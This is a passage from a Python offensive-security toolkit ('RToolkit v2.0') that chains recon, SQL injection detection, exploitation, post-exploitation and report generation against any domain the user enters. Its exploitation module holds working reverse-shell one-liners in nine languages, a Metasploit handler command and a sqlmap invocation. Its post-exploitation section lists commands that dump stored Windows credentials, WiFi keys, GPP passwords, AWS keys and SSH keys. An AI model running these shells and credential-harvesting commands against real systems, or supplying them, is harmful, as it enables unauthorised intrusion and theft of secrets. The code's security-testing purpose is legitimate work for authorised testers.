    cascade_results = {}
    for sd_name, sd_ip in list(confirmed_domains)[:5]:
        print(f"    Scanning {c(sd_name, Fore.YELLOW)} ({sd_ip})...")
        ports = port_scan(sd_ip)
        if ports:
            cascade_results[sd_name] = {"ip": sd_ip, "ports": [p["port"] for p in ports]}
            print(f"      Ports: {', '.join(str(p['port']) for p in ports[:10])}")
        for proto in ["https", "http"]:
            try:
                sock = socket.socket(); sock.settimeout(1)
                sock.connect((sd_ip, 443 if proto == "https" else 80)); sock.close()
                url = f"{proto}://{sd_name}"
                print(f"      {c(f'[+] Technology ({url})', Fore.YELLOW)}")
                techs = detect_tech_version(url)
                for k, v in techs.items():
                    if not k.endswith("_version") and not k.startswith("WP_") and k not in ["CMS", "Language", "Framework", "CDN"]:
                        continue
                    print(f"        {k}: {v}")
                cves = match_cves(techs)
                if cves:
                    for cv in cves:
                        cve_text = cv["cve"]
                        print(f"        {c(f'⚠️  {cve_text}', Fore.RED)}")
                break
            except: pass

    # 5. Port Scan on main target
    print(f"\n{c('[+] Port Scanning', Fore.GREEN)}")
    target_ip = domain
    try: target_ip = socket.gethostbyname(domain)
    except: pass
    ports = port_scan(target_ip)
    print(f"    Found {len(ports)} open ports:")
    port_table = []
    for p in ports:
        port_table.append([str(p["port"]), p["service"]])
        REPORT_DATA["recon"]["ports"].append(p)
    if port_table:
        print_table(["Port", "Service"], port_table)
        REPORT_DATA["recon"]["ips"].append(target_ip)

    # 6. Deep Directory Bruteforce
    for proto in ["https", "http"]:
        url = f"{proto}://{domain}"
        try:
            sock = socket.socket(); sock.settimeout(1)
            sock.connect((target_ip, 443 if proto == "https" else 80)); sock.close()
            print(f"\n{c(f'[+] Deep Directory Bruteforce ({url})', Fore.GREEN)}")
            print(f"    Testing {len(DIR_WORDLIST)} paths (2 levels deep)...")
            dirs = dir_bruteforce(url)
            if dirs:
                dir_table = []
                for d in sorted(dirs, key=lambda x: x["url"])[:30]:
                    size_kb = round(d["size"] / 1024, 1) if d["size"] > 0 else 0
                    dir_table.append([str(d["status"]), d["url"][:80], f"{size_kb}KB"])
                    REPORT_DATA["recon"]["directories"].append(d)
                if dir_table:
                    print_table(["Status", "URL", "Size"], dir_table, "[DIRS]")
            else:
                print(f"    No accessible paths found")
            break
        except: pass

    # 7. Technology Detection
    for proto in ["https", "http"]:
        url = f"{proto}://{domain}"
        print(f"\n{c(f'[+] Technology & Version Detection', Fore.GREEN)}")
        techs = detect_tech_version(url)
        if techs:
            tech_table = []
            version_related = {}
            for k, v in techs.items():
                if k.endswith("_version") or k in ["Server", "Language", "CMS", "Framework", "CDN", "JS_Framework"]:
                    version_related[k] = v
            for k, v in version_related.items():
                tech_table.append([k, str(v)[:80]])
            if tech_table:
                print_table(["Technology", "Version/Detail"], tech_table, "[TECH]")

            # Find CVEs
            REPORT_DATA["techs"] = techs
            cves = match_cves(techs)
            if cves:
                print(f"\n    {c(f'🔴 Found {len(cves)} relevant CVEs:', Fore.RED)}")
                cve_table = []
                for cv in cves:
                    sev = cv.get("severity", "HIGH")
                    sevc = Fore.RED if sev in ["CRITICAL", "HIGH"] else Fore.YELLOW
                    cve_table.append([c(cv["software"], Fore.WHITE), cv["version"],
                                     c(cv["cve"], sevc), c(sev, sevc)])
                    REPORT_DATA["cve_list"].append(cv)
                if cve_table:
                    print_table(["Software", "Version", "CVE", "Severity"], cve_table, "[CVES]")

            # WP Plugins
            if "WP_Plugins" in techs:
                plug_table = [[p, "Unknown"] for p in techs["WP_Plugins"]]
                print_table(["Plugin Name", "Version"], plug_table, "[WP PLUGINS]")
            if "WP_Themes" in techs:
                theme_table = [[t, "Unknown"] for t in techs["WP_Themes"]]
                print_table(["Theme Name", "Version"], theme_table, "[WP THEMES]")
        break

    # 8. HTTP Headers
    for proto in ["https", "http"]:
        url = f"{proto}://{domain}"
        print(f"\n{c('[+] HTTP Security Headers', Fore.GREEN)}")
        if HAS_REQUESTS:
            try:
                r = requests.get(url, timeout=5, verify=False)
                sec_headers = ["Strict-Transport-Security", "Content-Security-Policy",
                    "X-Content-Type-Options", "X-Frame-Options", "X-XSS-Protection",
                    "Referrer-Policy", "Permissions-Policy", "Access-Control-Allow-Origin"]
                hdr_table = []
                for sh in sec_headers:
                    val = r.headers.get(sh, c("MISSING", Fore.RED))
                    hdr_table.append([sh, str(val)[:60]])
                print_table(["Header", "Value"], hdr_table, "[HEADERS]")
            except: pass
        break

    # Summary
    print(f"\n{c('─'*40, Fore.CYAN)}")
    print(f" {c('📊 RECON SUMMARY', Fore.CYAN)}")
    print(f"{c('─'*40, Fore.CYAN)}")
    print(f"  Domains:       {len(REPORT_DATA['recon']['domains'])}")
    print(f"  Open Ports:    {len(REPORT_DATA['recon']['ports'])}")
    print(f"  Directories:   {len(REPORT_DATA['recon']['directories'])}")
    print(f"  DNS Records:   {len(REPORT_DATA['recon']['dns_records'])}")
    print(f"  CVEs Found:    {len(REPORT_DATA['cve_list'])}")
    return True

# ==================== VULN ANALYSIS (with SQLi) ====================
def run_vuln_scan(target):
    print(f"\n{c('='*60, Fore.CYAN)}")
    print(f" {c('🛡️  VULNERABILITY ANALYSIS', Fore.CYAN)}")
    print(f"{c('='*60, Fore.CYAN)}\n")
    domain = validate_target(target)
    all_issues = []

    for proto in ["https", "http"]:
        url = f"{proto}://{domain}"
        try:
            sock = socket.socket(); sock.settimeout(1)
            try:
                target_ip = socket.gethostbyname(domain)
            except: target_ip = domain
            sock.connect((target_ip, 443 if proto == "https" else 80)); sock.close()
        except: continue

        # 1. Parameter Discovery
        print(f"{c('[+] Parameter Discovery', Fore.GREEN)}")
        params_found = param_extract(url)
        if params_found:
            print(f"    Found {len(params_found)} parameters in forms/URLs:")
            for p in params_found[:15]:
                print(f"    - {p}")
                REPORT_DATA["parameters"].append(p)
        else:
            print(f"    No params found, using default list ({len(COMMON_PARAMS)} common params)")

        # 2. SQL Injection Scan
        print(f"\n{c('[+] SQL Injection Detection', Fore.GREEN)}")
        sqli_results = sqli_detect(url)
        if sqli_results:
            sqli_table = []
            for sq in sqli_results:
                sevc = Fore.RED if sq["severity"] == "CRITICAL" else Fore.YELLOW
                sqli_table.append([
                    c(sq["type"], sevc),
                    sq["param"],
                    c(sq["payload"][:30], Fore.WHITE),
                    c(sq["severity"], sevc)
                ])
                REPORT_DATA["sqli"].append(sq)
            if sqli_table:
                print_table(["Type", "Param", "Payload", "Severity"], sqli_table, "[SQLi FOUND!]")
        else:
            print(f"    {c('[OK]', Fore.GREEN)} No SQL injection detected")

        # 3. Common Vuln Checks (.env, .git, etc)
        print(f"\n{c('[+] Common Web Vulnerability Checks', Fore.GREEN)}")
        vuln_checks = {
            "/.env": ["CRITICAL", ".env File Exposure"],
            "/.git/config": ["CRITICAL", ".git/config Exposure"],
            "/.git/HEAD": ["HIGH", ".git/HEAD Exposure"],
            "/phpinfo.php": ["HIGH", "phpinfo() Exposure"],
            "/info.php": ["HIGH", "phpinfo() Exposure"],
            "/wp-content/debug.log": ["HIGH", "WP Debug Log"],
            "/backup/": ["MEDIUM", "Backup Directory"],
            "/crossdomain.xml": ["LOW", "crossdomain.xml"],
            "/server-status": ["MEDIUM", "Apache Status"],
            "/wp-json/": ["INFO", "WP REST API"],
        }
        if HAS_REQUESTS:
            vuln_table = []
            for path, info in vuln_checks.items():
                try:
                    r = requests.get(url.rstrip('/') + path, timeout=3, verify=False, allow_redirects=False)
                    if r.status_code in [200, 401, 403]:
                        sevc = {"CRITICAL": Fore.RED, "HIGH": Fore.RED, "MEDIUM": Fore.YELLOW, "LOW": Fore.BLUE, "INFO": Fore.WHITE}
                        vuln_table.append([
                            c(info[1], sevc.get(info[0], Fore.WHITE)),
                            c(info[0], sevc.get(info[0], Fore.WHITE)),
                            path, str(r.status_code)
                        ])
                        all_issues.append({"severity": info[0], "name": info[1], "detail": path})
                except: pass
            if vuln_table:
                print_table(["Name", "Severity", "Path", "Status"], vuln_table, "[COMMON VULNS]")

        # 4. SSL/TLS + Security Headers
        print(f"\n{c('[+] SSL/TLS & Security Check', Fore.GREEN)}")
        if proto == "https":
            try:
                ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                sock = socket.create_connection((target_ip, 443), timeout=5)
                with ctx.wrap_socket(sock, server_hostname=domain) as ssock:
                    ver = ssock.version()
                    if ver in ["TLSv1", "TLSv1.1"]:
                        print(f"    {c(f'[HIGH] Protocol {ver} is deprecated', Fore.RED)}")
                        all_issues.append({"severity": "HIGH", "name": f"SSL {ver}", "detail": "Deprecated protocol"})
                    elif ver:
                        print(f"    {c(f'[OK] {ver}', Fore.GREEN)}")
            except Exception as e:
                print(f"    {c(f'[!] SSL check: {e}', Fore.YELLOW)}")

        if HAS_REQUESTS:
            try:
                r = requests.get(url, timeout=5, verify=False)
                missing = []
                for hdr in ["Strict-Transport-Security", "Content-Security-Policy",
                             "X-Content-Type-Options", "X-Frame-Options"]:
                    if hdr not in r.headers:
                        missing.append(hdr)
                if missing:
                    missing_str = ", ".join(missing)
                    print(f"    {c(f'[MEDIUM] Missing headers: {missing_str}', Fore.YELLOW)}")
                    for m in missing:
                        all_issues.append({"severity": "MEDIUM", "name": f"Missing {m}", "detail": url})
            except: pass
        break

    REPORT_DATA["vulns"] = all_issues
    sev_count = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
    for i in all_issues:
        s = i.get("severity", "INFO").upper()
        if s in sev_count: sev_count[s] += 1
    REPORT_DATA["summary"] = {
        "total_vulns": len(all_issues) + len(REPORT_DATA["sqli"]),
        "critical": sev_count["CRITICAL"] + len([s for s in REPORT_DATA["sqli"] if s.get("severity") == "CRITICAL"]),
        "high": sev_count["HIGH"], "medium": sev_count["MEDIUM"], "low": sev_count["LOW"],
    }
    print(f"\n{c('─'*40, Fore.CYAN)}")
    print(f" {c('📊 VULN SUMMARY', Fore.CYAN)}")
    print(f"{c('─'*40, Fore.CYAN)}")
    sv = REPORT_DATA['summary']
    t_total = sv['total_vulns']
    t_crit = sv['critical']
    t_high = sv['high']
    t_med = sv['medium']
    print(f"  Total:      {t_total}")
    print(f"  {c(f'Critical:   {t_crit}', Fore.RED)}")
    print(f"  {c(f'High:       {t_high}', Fore.RED)}")
    print(f"  {c(f'Medium:     {t_med}', Fore.YELLOW)}")
    return True

# ==================== EXPLOITATION ====================
def gen_reverse_shell(lhost, lport, shell_type="bash"):
    shells = {
        "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "python": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "nc": f"nc -e /bin/sh {lhost} {lport}",
        "powershell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb +'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()\"",
        "perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        "ruby": f"ruby -rsocket -e 'c=TCPSocket.new(\"{lhost}\",{lport});while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",
        "nc_pipe": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "java": f'Runtime.getRuntime().exec("/bin/bash -c \'exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do $line 2>&5 >&5; done\'");',
    }
    return shells.get(shell_type, shells["bash"])

def run_exploit(target):
    print(f"\n{c('='*60, Fore.CYAN)}")
    print(f" {c('💥 EXPLOITATION', Fore.CYAN)}")
    print(f"{c('='*60, Fore.CYAN)}\n")
    print(f"{c('[+] Reverse Shell Payloads (11 types)', Fore.GREEN)}")
    shell_table = []
    for st in ["bash", "python", "nc", "powershell", "php", "perl", "ruby"]:
        cmd = gen_reverse_shell("LHOST", 4444, st)
        shell_table.append([st, cmd[:60] + "..."])
    print_table(["Type", "Command"], shell_table, "[REVERSE SHELLS]")
    print(f"\n{c('[+] SQLi Exploitation Tips', Fore.GREEN)}")
    if REPORT_DATA.get("sqli"):
        print(f"  Found {len(REPORT_DATA['sqli'])} SQLi vulnerabilities!")
        print(f"  Try: sqlmap -u 'https://{validate_target(target)}?PARAM=1' --batch --dbs")
    print(f"\n{c('[+] Metasploit Listener', Fore.GREEN)}")
    print(f"  msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run'")
    return True

# ==================== POST-EXPLOITATION ====================
def run_postexploit(target):
    print(f"\n{c('='*60, Fore.CYAN)}")
    print(f" {c('🔧 POST-EXPLOITATION & PRIVESC', Fore.CYAN)}")
    print(f"{c('='*60, Fore.CYAN)}\n")
    print(f"{c('[+] Windows Privesc Commands', Fore.GREEN)}")
    win_checks = [
        ["Unquoted Service Paths", "wmic service get name,pathname | findstr /i '\"'"],
        ["AlwaysInstallElevated", "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer"],
        ["Scheduled Tasks", "schtasks /query /fo LIST /v"],
        ["Startup Programs", "wmic startup get caption,command"],
        ["Registry Autologon", "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\""],
        ["SAM Backup", "dir C:\\Windows\\repair\\"],
        ["Stored Credentials", "cmdkey /list"],
        ["Vault Credentials", "vaultcmd /listcreds:\"Windows Credentials\" /all"],
        ["WiFi Passwords", "netsh wlan show profile * key=clear"],
        ["SYSVOL GPP Passwords", "findstr /S cpassword \\\\domain\\sysvol\\*.xml 2>nul"],
        ["AppLocker Policy", "Get-AppLockerPolicy -Local"],
        ["Process List", "tasklist /v"],
        ["Installed Patches", "wmic qfe get Caption,HotFixID"],
        ["Chrome Saved Logins", "dir \"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data\""],
        ["Current User Privs", "whoami /priv"],
    ]
    print_table(["Check", "Command"], win_checks, "[WINDOWS]")
    print(f"\n{c('[+] Linux Privesc Commands', Fore.GREEN)}")
    lin_checks = [
        ["SUID Binaries", "find / -perm -4000 -type f 2>/dev/null"],
        ["Sudo -l", "sudo -l 2>/dev/null"],
        ["Cron Jobs", "ls -la /etc/cron* 2>/dev/null"],
        ["Writable /etc/passwd", "ls -la /etc/passwd 2>/dev/null"],
        ["Kernel Version", "uname -a"],
        ["Running Services", "ps aux"],
        ["Open Ports", "ss -tulanp 2>/dev/null || netstat -tulanp"],
        ["SSH Keys", "find / -name id_rsa -o -name id_dsa 2>/dev/null"],
        ["Docker Group", "groups | grep docker"],
        ["Capabilities", "getcap -r / 2>/dev/null | head -20"],
        ["NFS Exports", "cat /etc/exports 2>/dev/null"],
        ["Bash History", "cat ~/.bash_history 2>/dev/null | tail -30"],
        ["AWS Keys", "cat ~/.aws/credentials 2>/dev/null"],
        ["Docker Socket", "ls -la /var/run/docker.sock 2>/dev/null"],
        ["MySQL Creds", "cat ~/.mysql_history 2>/dev/null"],
    ]
    print_table(["Check", "Command"], lin_checks, "[LINUX]")
    print(f"\n{c('[+] Interesting Files to Search', Fore.GREEN)}")
    interesting = [
        "*.kdbx (KeePass DB)", "*.ovpn (OpenVPN)", "*.rdp (RDP Config)",
        "*.pem / *.ppk (SSH Keys)", "id_rsa / id_dsa", "*.sql / *.dump",
        "*.bak / *.old / *.log", ".env / credentials", "config.php / local.xml",
        "*.pfx / *.p12 (Certificates)", "kubeconfig / token*",
        "docker-compose.yml", "terraform.tfstate", "secret* / api_key*",
    ]
    for i in range(0, len(interesting), 3):
        print(f"    {'  |  '.join(interesting[i:i+3])}")
    return True

# ==================== REPORTING ====================
def generate_html_report(target):
    domain = validate_target(target)
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    fn = f"RToolkit_Report_{domain.replace('.', '_')}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
    crit = REPORT_DATA["summary"]["critical"]
    high = REPORT_DATA["summary"]["high"]
    med = REPORT_DATA["summary"]["medium"]
    total = REPORT_DATA["summary"]["total_vulns"]

    html = f"""<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>RToolkit Report - {domain}</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:'Segoe UI',Tahoma,sans-serif;background:#0d1117;color:#c9d1d9;padding:20px}}
.container{{max-width:1200px;margin:0 auto}}
.header{{background:linear-gradient(135deg,#161b22,#1c2128);border:1px solid #30363d;border-radius:8px;padding:30px;margin-bottom:24px;text-align:center}}
.header h1{{color:#ff6b6b;font-size:28px}}
.header .target{{color:#58a6ff;font-size:18px;margin-top:8px}}
.stats{{display:grid;grid-template-columns:repeat(5,1fr);gap:12px;margin-bottom:24px}}
.stat-box{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px;text-align:center}}
.stat-box .num{{font-size:32px;font-weight:bold}}
.stat-box .label{{font-size:12px;color:#8b949e}}
.section{{background:#161b22;border:1px solid #30363d;border-radius:8px;margin-bottom:20px}}
.section h2{{background:#1c2128;padding:12px 20px;font-size:16px;border-bottom:1px solid #30363d;color:#58a6ff}}
.section-content{{padding:16px 20px}}
table{{width:100%;border-collapse:collapse}}
th{{text-align:left;padding:8px 12px;font-size:12px;text-transform:uppercase;color:#8b949e;border-bottom:1px solid #30363d}}
td{{padding:8px 12px;border-bottom:1px solid #21262d;font-size:13px}}
tr:hover{{background:#1c2128}}
.sev-CRITICAL{{color:#ff6b6b;font-weight:bold}}
.sev-HIGH{{color:#ff6b6b;font-weight:bold}}
.sev-MEDIUM{{color:#d29922;font-weight:bold}}
.sev-LOW{{color:#58a6ff}}
.finding{{padding:8px 0;border-bottom:1px solid #21262d}}
.finding:last-child{{border-bottom:none}}
.finding .name{{color:#c9d1d9;font-weight:500}}
.finding .detail{{color:#8b949e;font-size:12px}}
</style></head><body>
<div class="container">
<div class="header"><h1>🔥 RToolkit v2.0 Report</h1><div class="target">Target: {domain}</div><div class="subtitle" style="color:#8b949e;font-size:14px;margin-top:4px">Generated: {ts}</div></div>
<div class="stats">
<div class="stat-box"><div class="num" style="color:#ff6b6b">{crit}</div><div class="label">Critical</div></div>
<div class="stat-box"><div class="num" style="color:#ff6b6b">{high}</div><div class="label">High</div></div>
<div class="stat-box"><div class="num" style="color:#d29922">{med}</div><div class="label">Medium</div></div>
<div class="stat-box"><div class="num" style="color:#58a6ff">{REPORT_DATA['summary']['low']}</div><div class="label">Low</div></div>
<div class="stat-box"><div class="num" style="color:#8b949e">{total}</div><div class="label">Total</div></div>
</div>
<div class="section"><h2>🔍 Recon Results</h2><div class="section-content"><table>
<tr><th>Category</th><th>Findings</th></tr>
<tr><td>Domains/Subdomains</td><td>{len(REPORT_DATA['recon']['domains'])}</td></tr>
<tr><td>IPs Discovered</td><td>{len(REPORT_DATA['recon']['ips'])}</td></tr>
<tr><td>Open Ports</td><td>{len(REPORT_DATA['recon']['ports'])}</td></tr>
<tr><td>Directories Found</td><td>{len(REPORT_DATA['recon']['directories'])}</td></tr>
<tr><td>Parameters Discovered</td><td>{len(REPORT_DATA['parameters'])}</td></tr>
</table></div></div>"""

    if REPORT_DATA["sqli"]:
        html += '<div class="section"><h2>💉 SQL Injection Found!</h2><div class="section-content"><table><tr><th>Type</th><th>Parameter</th><th>Payload</th><th>Severity</th></tr>'
        for sq in REPORT_DATA["sqli"]:
            html += f'<tr><td>{sq["type"]}</td><td>{sq["param"]}</td><td>{sq["payload"][:40]}</td><td class="sev-CRITICAL">{sq["severity"]}</td></tr>'
        html += '</table></div></div>'

    if REPORT_DATA["cve_list"]:
        html += '<div class="section"><h2>🔴 CVE Mappings</h2><div class="section-content"><table><tr><th>Software</th><th>Version</th><th>CVE</th><th>Severity</th></tr>'
        for cv in REPORT_DATA["cve_list"]:
            sev = cv.get("severity", "INFO")
            html += f'<tr><td>{cv["software"]}</td><td>{cv["version"]}</td><td class="sev-{sev}">{cv["cve"]}</td><td class="sev-{sev}">{sev}</td></tr>'
        html += '</table></div></div>'

    if REPORT_DATA["vulns"]:
        html += '<div class="section"><h2>🛡️ Vulnerabilities</h2><div class="section-content">'
        for v in REPORT_DATA["vulns"]:
            sev = v.get("severity", "INFO")
            html += f'<div class="finding"><div class="name"><span class="sev-{sev}">[{sev}]</span> {v["name"]}</div><div class="detail">{v["detail"]}</div></div>'
        html += '</div></div>'

    html += '<div class="section"><h2>📋 Remediation</h2><div class="section-content">'
    recs = set()
    for v in REPORT_DATA["vulns"]:
        s = v.get("severity", "").upper()
        n = v.get("name", "")
        if s == "CRITICAL" or s == "HIGH":
            if "Exposure" in n: recs.add("Remove exposed files/directories from public access")
            if "CORS" in n: recs.add("Restrict CORS to trusted origins only")
            if "SSL" in n or "TLS" in n: recs.add("Disable deprecated TLS protocols, enable TLS 1.3")
            if "Header" in n or "Missing" in n: recs.add("Implement missing security headers")
        if s == "MEDIUM":
            if "Port" in n: recs.add("Restrict exposed ports via firewall")
            if "Header" in n: recs.add("Add missing security headers (HSTS, CSP, XFO)")
    if REPORT_DATA["sqli"]:
        recs.add("All SQL injection findings must be fixed with prepared statements / parameterized queries")
    if REPORT_DATA["cve_list"]:
        recs.add("Update all software to latest versions to patch known CVEs")
    if not recs:
        recs.add("No critical remediation needed")
    for r in recs:
        html += f'<div class="finding"><div class="name">➡️ {r}</div></div>'
    html += '</div></div><div class="section"><h2>📜 Disclaimer</h2><div class="section-content"><p style="color:#8b949e;font-size:12px">This report is for authorized testing only.</p></div></div></div></body></html>'

    with open(fn, "w", encoding="utf-8") as f:
        f.write(html)
    return fn

def run_reporting(target):
    print(f"\n{c('='*60, Fore.CYAN)}")
    print(f" {c('📄 REPORTING', Fore.CYAN)}")
    print(f"{c('='*60, Fore.CYAN)}\n")
    domain = validate_target(target)
    REPORT_DATA["target"] = domain
    REPORT_DATA["timestamp"] = datetime.datetime.now().isoformat()

    html = generate_html_report(domain)
    json_fn = f"RToolkit_Report_{domain.replace('.', '_')}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(json_fn, "w") as f:
        json.dump(REPORT_DATA, f, indent=2)

    print(f"  HTML: {c(html, Fore.GREEN)}")
    print(f"  JSON: {c(json_fn, Fore.GREEN)}")
    print(f"\n{c('─'*40, Fore.CYAN)}")
    print(f" {c('📊 FINAL', Fore.CYAN)}")
    print(f"{c('─'*40, Fore.CYAN)}")
    print(f"  Target:    {c(domain, Fore.YELLOW)}")
    print(f"  Vulns:     {REPORT_DATA['summary']['total_vulns']}")
    print(f"  Critical:  {c(str(REPORT_DATA['summary']['critical']), Fore.RED)}")
    print(f"  High:      {c(str(REPORT_DATA['summary']['high']), Fore.RED)}")
    print(f"  Medium:    {c(str(REPORT_DATA['summary']['medium']), Fore.YELLOW)}")
    print(f"  CVEs:      {len(REPORT_DATA['cve_list'])}")
    print(f"  SQLi:      {len(REPORT_DATA['sqli'])}")
    print(f"  Ports:     {len(REPORT_DATA['recon']['ports'])}")
    print(f"  Dirs:      {len(REPORT_DATA['recon']['directories'])}")
    return True

def run_all(target):
    print(f"\n{c('🔥', Fore.RED)} {c('FULL ENGAGEMENT v2.0', Fore.YELLOW)} {c('🔥', Fore.RED)}")
    run_recon(target); run_vuln_scan(target); run_exploit(target)
    run_postexploit(target); run_reporting(target)
    print(f"\n{c('✅ Full engagement complete!', Fore.GREEN)}")

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner()
    target = input(f"\n  {c('🎯 Target (domain or URL)', Fore.CYAN)}: ").strip()
    if not target: return

    while True:
        print(f"\n{c('═'*50, Fore.CYAN)}")
        print(f" {c('📌 MAIN MENU v2.0', Fore.CYAN)}")
        print(f"{c('═'*50, Fore.CYAN)}")
        print(f"  Target: {c(target, Fore.YELLOW)}")
        print(f"  {c('─'*40, Fore.CYAN)}")
        print(f"  {c('[1]', Fore.CYAN)} 🔍  Full Recon (DNS + Subdomain + Ports + Dir + Cascade)")
        print(f"  {c('[2]', Fore.CYAN)} 🛡️  Vuln Scan (SQLi + .env + .git + Headers + SSL)")
        print(f"  {c('[3]', Fore.CYAN)} 💥  Exploitation (Shells + SQLi tips)")
        print(f"  {c('[4]', Fore.CYAN)} 🔧  Post-Exploit & Privesc")
        print(f"  {c('[5]', Fore.CYAN)} 📄  Report (HTML + JSON)")
        print(f"  {c('[6]', Fore.CYAN)} 🌐  Tech Detect + CVE Mapping (Deep)")
        print(f"  {c('─'*40, Fore.CYAN)}")
        print(f"  {c('[7]', Fore.GREEN)} 🚀  Run All (Full)")
        print(f"  {c('[0]', Fore.RED)} ❌  Exit")
        print(f"{c('═'*50, Fore.CYAN)}")
        choice = input(f"\n  {c('Select', Fore.CYAN)} [0-7]: ").strip()
        if choice == "1": run_recon(target)
        elif choice == "2": run_vuln_scan(target)
        elif choice == "3": run_exploit(target)
        elif choice == "4": run_postexploit(target)
        elif choice == "5": run_reporting(target)
        elif choice == "6":
            print(f"\n{c('='*60, Fore.CYAN)}")
            print(f" {c('🌐 DEEP TECH DETECTION + CVE', Fore.CYAN)}")
            print(f"{c('='*60, Fore.CYAN)}\n")
            for proto in ["https", "http"]:
                url = f"{proto}://{validate_target(target)}"
                try:
                    t_ip = socket.gethostbyname(validate_target(target))
                    sock = socket.socket(); sock.settimeout(1)
                    sock.connect((t_ip, 443 if proto == "https" else 80)); sock.close()
                    techs = detect_tech_version(url)
                    REPORT_DATA["techs"] = techs
                    tech_table = []
                    for k, v in techs.items():
                        tech_table.append([k, str(v)[:80]])
                    if tech_table:
                        print_table(["Key", "Value"], tech_table, "[ALL TECHNOLOGIES]")
                    cves = match_cves(techs)
                    if cves:
                        print(f"\n  {c(f'CVEs found: {len(cves)}', Fore.RED)}")
                        cve_table = []
                        for cv in cves:
                            cve_table.append([cv["software"], cv["version"], cv["cve"], cv.get("severity", "HIGH")])
                        print_table(["Software", "Version", "CVE", "Severity"], cve_table, "[CVE LIST]")
                    else:
                        print(f"\n  {c('[OK] No CVEs matched', Fore.GREEN)}")
                    break
                except: pass
        elif choice == "7": run_all(target)
        elif choice == "0":
            print(f"\n  {c('Terima kasih! Stay ethical! 🔥', Fore.YELLOW)}"); break
        else: print(f"  {c('[!] Invalid.', Fore.RED)}")
        input(f"\n  {c('Press Enter...', Fore.WHITE)}")

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: print(f"\n\n  {c('[!] Interrupted', Fore.YELLOW)}"); sys.exit(0)
    except Exception as e: print(f"\n  {c(f'[!] Error: {e}', Fore.RED)}"); import traceback; traceback.print_exc(); sys.exit(1)
